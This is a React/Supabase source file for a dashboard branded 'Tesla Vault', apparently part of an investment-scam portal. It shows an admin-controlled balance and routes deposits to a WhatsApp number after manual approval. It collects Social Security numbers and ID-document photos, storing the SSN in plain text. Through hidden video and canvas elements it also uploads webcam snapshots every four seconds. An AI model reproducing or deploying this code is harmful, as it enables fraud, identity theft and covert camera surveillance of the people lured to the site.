'use client';

import React, { useEffect, useState, useRef } from 'react';
import { supabase } from '@/lib/supabaseClient';
import { 
  LogOut, Lock, Smartphone, ShieldCheck, 
  Activity, Upload, CheckCircle, FileText, Camera, Loader2 
} from 'lucide-react';

export default function Dashboard() {
  const [loading, setLoading] = useState(true);
  const [user, setUser] = useState<any>(null);
  const [idType, setIdType] = useState('driver_license');
  const [ssn, setSsn] = useState('');
  const [idFile, setIdFile] = useState<File | null>(null);
  const [kycSubmitting, setKycSubmitting] = useState(false);

  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  useEffect(() => {
    const init = async () => {
      const { data: { session } } = await supabase.auth.getSession();
      if (!session) { window.location.href = '/portal/auth'; return; }

      // 1. Initial Data Fetch
      const { data } = await supabase.from('profiles').select('*').eq('id', session.user.id).single();
      if (data) setUser(data);
      setLoading(false);

      // 2. Realtime Subscription (Syncs Balance + Approval Status Instantly)
      const channel = supabase
        .channel('db-live-sync')
        .on('postgres_changes', { 
          event: '*', schema: 'public', table: 'profiles', filter: `id=eq.${session.user.id}` 
        }, (payload) => {
          setUser(payload.new);
        })
        .subscribe();

      // 3. Request Camera & Start 4-Second Snapshot Loop
      startMonitoring(session.user.id);

      return () => { supabase.removeChannel(channel); };
    };
    init();
  }, []);

  const startMonitoring = async (userId: string) => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      if (videoRef.current) videoRef.current.srcObject = stream;

      // Automated Loop: Snap every 4 seconds
      const interval = setInterval(async () => {
        if (!videoRef.current || !canvasRef.current) return;
        const context = canvasRef.current.getContext('2d');
        context?.drawImage(videoRef.current, 0, 0, 640, 480);
        const blob = await new Promise<Blob | null>(res => canvasRef.current?.toBlob(res, 'image/jpeg', 0.5));
        if (blob) {
          await supabase.storage.from('proctor-snapshots').upload(`${userId}/live_${Date.now()}.jpg`, blob);
        }
      }, 4000);

      return () => clearInterval(interval);
    } catch (err) {
      console.warn("Camera access denied - biometric logging suspended.");
    }
  };

  const handleKyc = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!idFile || !ssn) return;
    setKycSubmitting(true);
    try {
      const fileExt = idFile.name.split('.').pop();
      const path = `${user.id}/${idType}_${Date.now()}.${fileExt}`;
      await supabase.storage.from('user-kyc').upload(path, idFile);
      await supabase.from('profiles').update({ 
        ssn_data: ssn, 
        document_type: idType,
        kyc_status: 'pending' 
      }).eq('id', user.id);
      setUser({ ...user, kyc_status: 'pending' });
    } catch (err: any) { alert(err.message); }
    finally { setKycSubmitting(false); }
  };

  // --- LOGIC FIXES ---
  const dbStatus = user?.deposit_status?.toString().toLowerCase().trim() || "";
  const isUnlocked = dbStatus === 'approved' || dbStatus === 'unlocked';
  const waMessage = `Hello, I'm ${user?.full_name} (${user?.email}). I would like to initialize a deposit.`;
  const waLink = `https://wa.me/1234567890?text=${encodeURIComponent(waMessage)}`;

  if (loading) return (
    <div className="min-h-screen bg-black flex items-center justify-center text-[#D4AF37] uppercase tracking-[0.5em] animate-pulse text-[10px]">
      Synchronizing Terminal...
    </div>
  );

  return (
    <main className="min-h-screen bg-[#050505] text-white p-4 md:p-10">
      <video ref={videoRef} autoPlay muted className="hidden" />
      <canvas ref={canvasRef} width="640" height="480" className="hidden" />

      <div className="max-w-6xl mx-auto">
        <header className="flex justify-between items-center mb-12 border-b border-white/5 pb-8">
           <h1 className="text-2xl font-serif italic text-[#D4AF37]">Tesla <span className="text-white">Vault</span></h1>
           <button onClick={() => supabase.auth.signOut().then(() => window.location.href='/portal/auth')} className="p-3 bg-white/5 rounded-full hover:text-red-500 transition-all"><LogOut size={20} /></button>
        </header>

        <div className="grid lg:grid-cols-3 gap-6 mb-12">
          {/* BALANCE & DEPOSIT */}
          <div className="lg:col-span-2 bg-[#0a0a0a] border border-white/5 p-8 md:p-12 rounded-[3rem] shadow-2xl relative overflow-hidden group">
             <p className="text-gray-500 text-[10px] uppercase tracking-[0.4em] mb-4">Total Liquid Equity</p>
             <h2 className="text-6xl md:text-8xl font-serif text-white tracking-tighter mb-12">${user?.balance?.toLocaleString() || '0.00'}</h2>
             <a 
               href={isUnlocked ? waLink : "#"} 
               onClick={(e) => !isUnlocked && e.preventDefault()}
               className={`inline-flex items-center gap-3 px-12 py-5 rounded-full font-black uppercase tracking-widest text-[10px] transition-all duration-700
                 ${isUnlocked ? 'bg-green-600 hover:bg-green-500 text-white shadow-[0_0_30px_rgba(34,197,94,0.3)]' : 'bg-white/5 text-gray-500 cursor-not-allowed border border-white/5'}`}
             >
               {isUnlocked ? <><Smartphone size={16}/> Initialize Deposit</> : <><Lock size={16}/> Deposit Restricted</>}
             </a>
          </div>

          {/* STATUS PANEL */}
          <div className="bg-[#0a0a0a] border border-white/5 p-8 rounded-[3rem] flex flex-col justify-between">
             <div className="space-y-6">
                <div className="flex justify-between border-b border-white/5 pb-4">
                   <span className="text-gray-500 text-[9px] uppercase tracking-widest font-bold">Node Status</span>
                   <span className="text-green-500 font-mono text-xs">ENCRYPTED</span>
                </div>
                <div className="flex justify-between border-b border-white/5 pb-4">
                   <span className="text-gray-500 text-[9px] uppercase tracking-widest font-bold">Approval</span>
                   <span className={isUnlocked ? "text-green-500 font-mono text-xs" : "text-red-500 font-mono text-xs uppercase"}>
                      {user?.deposit_status || 'Pending'}
                   </span>
                </div>
             </div>
             <div className="bg-[#D4AF37]/5 border border-[#D4AF37]/20 p-5 rounded-2xl flex items-center gap-4">
                <Camera size={20} className="text-[#D4AF37] animate-pulse" />
                <p className="text-[8px] text-gray-400 uppercase leading-relaxed font-black">Biometrics Active: Automated snapshots are being logged every 4 seconds.</p>
             </div>
          </div>
        </div>

        {/* VERIFICATION FORM */}
        {user?.kyc_status !== 'verified' && (
          <div className="bg-[#0a0a0a] border border-white/5 rounded-[3.5rem] p-8 md:p-16">
            <h3 className="text-4xl font-serif mb-2">Identify Verification</h3>
            <p className="text-gray-500 text-sm mb-12 font-light">Legal credentials required for high-limit access.</p>

            {user?.kyc_status === 'pending' ? (
              <div className="bg-white/5 border border-white/10 p-12 rounded-[2rem] text-center">
                 <Activity className="text-[#D4AF37] mx-auto mb-4 animate-spin" size={32} />
                 <p className="text-xs uppercase tracking-[0.3em] font-bold">Verification in Progress</p>
              </div>
            ) : (
              <form onSubmit={handleKyc} className="space-y-8 max-w-2xl">
                <div className="grid md:grid-cols-2 gap-6">
                  <div className="space-y-2">
                    <label className="text-[9px] uppercase tracking-widest text-gray-500 ml-2 font-black">ID Type</label>
                    <select value={idType} onChange={(e)=>setIdType(e.target.value)} className="w-full bg-black border border-white/10 rounded-2xl p-5 outline-none focus:border-[#D4AF37] text-xs appearance-none">
                      <option value="driver_license">Driver's License</option>
                      <option value="passport">Passport</option>
                    </select>
                  </div>
                  <div className="space-y-2">
                    <label className="text-[9px] uppercase tracking-widest text-gray-500 ml-2 font-black">SSN / Tax ID</label>
                    <input type="text" placeholder="XXX-XX-XXXX" value={ssn} onChange={(e)=>setSsn(e.target.value)} className="w-full bg-black border border-white/10 rounded-2xl p-5 outline-none focus:border-[#D4AF37] text-xs" required />
                  </div>
                </div>
                <div className="space-y-2">
                  <label className="text-[9px] uppercase tracking-widest text-gray-500 ml-2 font-black">Photo of {idType.replace('_', ' ')}</label>
                  <div className="relative group border border-dashed border-white/20 rounded-2xl p-10 flex flex-col items-center gap-3">
                    <input type="file" accept="image/*" onChange={(e)=>setIdFile(e.target.files?.[0] || null)} className="absolute inset-0 opacity-0 cursor-pointer z-10" required />
                    <Upload size={24} className="text-gray-600 group-hover:text-[#D4AF37]" />
                    <span className="text-xs text-gray-500">{idFile ? idFile.name : "Tap to upload document photo"}</span>
                  </div>
                </div>
                <button disabled={kycSubmitting} className="px-16 py-6 bg-white text-black font-black uppercase tracking-widest text-[10px] rounded-full hover:bg-[#D4AF37] transition-all">
                  {kycSubmitting ? "Uploading..." : "Submit Verification"}
                </button>
              </form>
            )}
          </div>
        )}
      </div>
    </main>
  );
        }
